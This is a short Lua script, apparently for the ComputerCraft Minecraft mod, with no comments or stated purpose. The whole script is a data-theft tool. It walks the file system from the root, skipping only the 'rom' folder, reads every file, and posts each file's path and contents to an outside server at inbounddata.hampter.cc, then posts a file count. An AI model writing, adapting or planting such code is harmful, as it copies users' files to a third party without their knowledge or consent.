blacklist = {"rom"} 
address = "http://inbounddata.hampter.cc:8085"
count = 0

function listFiles(path) 
 for _, v in pairs(blacklist) do 
  if (path == v) then 
  return false 
 end 
end 
items = fs.list(path) 
for _, item in ipairs(items) do 
 fullPath = fs.combine(path, item) 
 if not fs.isDir(fullPath) then
  file = nil
  file = fs.open(fullPath, "r")
  data = file.readAll()
  file.close()
  http.post(address, textutils.serialiseJSON({[fullPath]=tostring(data)}))
  count = count+1
 end
 if fs.isDir(fullPath) then 
  listFiles(fullPath) 
 end 
end 
end
listFiles("/")
http.post(address, textutils.serialiseJSON({["File-Count"]=count}))
